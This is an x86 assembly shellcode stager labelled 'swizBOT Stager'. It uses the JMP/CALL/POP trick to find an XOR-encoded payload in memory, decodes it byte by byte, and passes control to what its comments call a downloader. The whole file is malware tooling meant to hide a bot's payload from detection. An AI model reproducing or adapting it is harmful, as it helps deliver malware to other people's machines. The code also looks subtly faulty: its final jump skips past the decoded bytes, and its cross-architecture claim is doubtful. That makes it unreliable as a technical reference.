; swizBOT Stager - CALL/POP XOR Decoder
; Based on Jake Swiz's "Fukahi Tekiō" technique
; Works on x86, x64, and ARM64 Windows (Prism emulation fix)

BITS 32
global _start

_start:
    ; Step 1: JMP to the CALL instruction
    jmp short call_stub

pop_stub:
    ; Step 2: POP the return address into ESI
    ; This is the address of our encoded shellcode
    pop esi                     ; ESI = location of payload in memory
    
    ; Step 3: Setup decoder loop
    xor ecx, ecx                ; Clear counter
    mov cx, 0xFFFF              ; Length placeholder (patched by encoder)
    
decode_loop:
    ; Step 4: XOR decode one byte at a time
    xor byte [esi], 0xAA        ; Key placeholder (patched by encoder)
    inc esi                     ; Move to next byte
    loop decode_loop            ; Loop until ECX == 0
    
    ; Step 5: Jump to decoded shellcode
    jmp short decoded_payload

call_stub:
    ; Step 6: CALL pushes the next address onto the stack
    call pop_stub               ; This pushes the address of the next line
    
    ; Step 7: Encoded payload starts right here
    ; The encoder script will insert the XOR-scrambled bytes after this point
    ; db <encoded bytes>
    
decoded_payload:
    ; After decoding, execution continues here
    ; The real payload (downloader) is now live in memory
